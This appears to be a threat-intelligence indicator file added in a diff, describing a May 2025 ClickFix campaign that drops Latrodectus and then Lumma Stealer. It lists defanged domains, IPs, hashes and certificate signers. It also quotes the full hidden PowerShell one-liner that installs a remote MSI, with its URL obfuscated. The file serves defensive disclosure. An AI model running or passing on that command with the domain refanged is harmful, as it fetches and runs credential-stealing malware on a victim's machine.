@@ -1,0 +1,132 @@
+2025-05-16 (FRIDAY): CLICKFIX ACTIVITY ENDING WITH LUMMA STEALER
+
+AUTHOR:
+
+- Zack Fink
+
+ORIGINAL REFERENCE:
+
+- https://x.com/SquiblydooBlog/status/1922375875548320203
+
+BACKGROUND:
+
+- "ClickFix" is a technique using legitimate but compromised websites that lead to malicious pages.
+- These malicious pages have messages instructing victims to paste script into a run window.
+- This script is most often malicious PowerShell script designed to infect Windows computers with malware.
+
+NOTES:
+
+- In this wave of ClickFix activity, the malicious PowerShell script retrieves and an .msi file and runs it in system memory.
+- From system memory, the .msi file drops a legitimate EXE and malicious DLL used for DLL side-loading.
+- The malicious DLL appears to be associated with Latroductus (Blackwidow) malware.
+- The follow-up malware appears to be Lumma Stealer.
+
+OVERALL INFECTION FLOW:
+
+- Clickfix style script --> files for the initial infection --> Latrodectus --> Lumma Stealer
+
+EXAMPLE OF CLICKFIX STYLE SCRIPT:
+
+- "C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$i=New-Object -ComObject 
+  WindowsInstaller.Installer;$i.UILevel=2;$u='htps://thob[.]live/'.Insert(2,'t');$i.InstallProduct($u,'')"; 
+  Service connection checkup : 1734
+
+- Note 1: the "htps://" above is not a typo. The script inserters another "t" using ".Insert(2,'t')"
+- Note 2: the "thob[.]live" domain in above script is de-fanged.
+
+EXAMPLES OF DOMAINS FROM THE INITIAL CLICKFIX STYLE SCRIPT:
+
+-   atri[.]live
+- m.bjeb[.]live
+- b.ekoz[.]live
+-   cqsf[.]live
+-   rekx[.]live
+-   thob[.]live
+-   dlux[.]live
+
+IP ADDRESS HOSTING SOME OF THE FOLLOW-UP MALWARE:
+
+- 141.94.53[.]219
+
+LATRODECTUS (BLACKWIDOW) C2 DOMAINS NOTED:
+
+- architrata[.]com
+- carflotyup[.]com
+- lofiramegi[.]com
+- topguningit[.]com
+
+- Note: Lumma Stealer would have been sent through the Latrodectus C2 traffic, which we've seen before at:
+  -- https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-03-07-IOCs-for-Latrodectus-and-Lumma-Stealer.txt
+
+UNIQUE SIGNERS OF DIGITAL SIGNATURE ASSOCIATED WITH SOME OF THE MALWARE: 
+
+- Tim Instruments Limited Liability Company
+- LLC Freshmix
+- Wuhan Yichuang Technology Co., Ltd.
+- Wuxi Weitai Nano Technology Co., Ltd.
+
+FILES SEEN DURING THIS INFECTION:
+
+- SHA256 hash: a399bf56687bc04707fc1cc7771725f500d5d70d4fcdfbc3462d6b1ff37b8a9d
+- File size: 2,855,680 bytes
+- File location: hxxp[:]//141.94.53[.]219/2/123.exe
+- File type: PE32+ executable (console) x86-64, for MS Windows
+- Revoked certificate includes the following signer: LLC Freshmix
+- File description: 64-bit Windows EXE associated with this activity
+
+- SHA256 hash: 94479572d99e07c50d39c46c8a96843e1c8ae80ce126ae3ba4c4fd223e3d731a 
+- File size: 716,104 bytes
+- File location: hxxp[:]//141.94.53[.]219/3/0.exe
+- File type: PE32+ executable (console) x86-64, for MS Windows
+- Revoked certificate includes the following signer: Tim Instruments Limited Liability Company
+- File description: 64-bit Windows EXE associated with this activity
+
+- SHA256 hash: 9d851620712c8122ee50d25723800ef2ecfb6bd7f810f0a1909b5f5808d8055f
+- File size: 324,096 bytes
+- File location: hxxp[:]//141.94.53[.]219/3/or2.dll
+- File type: PE32+ executable (DLL) (console) x86-64, for MS Windows
+- File description: 64-bit Windows DLL associated with this activity
+
+- SHA256 hash: 391c964bd8df38ac4f024fff99528182f17fbd8e30fca43272f6812c34fa53b7
+- File size: 132,096 bytes
+- File type: PE32 executable (GUI) Intel 80386, for MS Windows
+- File description: Windows EXE associated with this activity
+- Note: Generates URL for hxxps[:]//smartlifeshift[.]com/share/466cc0b75fa453dbf9b068341cea5e77f8543c626b7a905af578a415ae7791d0.exe
+
+- SHA256 hash: 5070cc64b72062e18baa2ba164e1fef9d9a57a9962a64738d8405cd8c3af5101
+- File size: 3,633,424 bytes
+- File type: PE32+ executable (DLL) (console) x86-64, for MS Windows
+- Revoked certificate includes the following signer: Wuxi Weitai Nano Technology Co., Ltd.
+- File description: 64-bit Windows DLL side-loaded by NVIDIA Notification.exe ????
+
+- SHA256 hash: 6c94c9d7e231523e06b41275ab208e42cdd39278f341123b066b05a0a6830e4d
+- File size: 3,342,376 bytes
+- File name: NVIDIA Notification.exe
+- File type: PE32+ executable (GUI) x86-64, for MS Windows
+- File description: Legitimate Windows EXE used to side-load malicious DLL named libcef.dll
+- Note: This file is not malicious
+
+FOLLOW-UP LUMMA STEALER INFORMATION:
+
+- SHA256 hash: 146affbf12b8998f04fa2daf5e5e7bcc6b535e2097cbd541c690b3eca7d8e03b
+- File size: 5,599,463 bytes
+- File type: PE32 executable (GUI) Intel 80386, for MS Windows
+- File description: Windows EXE installer for Lumma Stealer associated with this activity
+
+- SHA256 hash: 8502cabd12fa8c56c5ab62bdbb714592d0e4452efa025cf558de0a9e7605ad43
+- File size: 4,857,488 bytes
+- File type: PE32 executable (GUI) Intel 80386, for MS Windows
+- File description: Windows EXE installer for Lumma Stealer associated with this activity
+
+DOMAINS FOR LUMMA STEALER C2 TRAFFIC FROM THE ABOVE TWO SAMPLES:
+
+- furthert[.]run
+- jrxsafer[.]top
+- plantainklj[.]run
+- puerrogfh[.]live
+- quavabvc[.]top
+- quityt[.]digital
+- rambutanvcx[.]run
+- targett[.]top
+- ywmedici[.]top
+- steamcommunity[.]com <-- not malicious on its own, but Lumma Stealer is known to abuse Steam profiles for C2 traffic
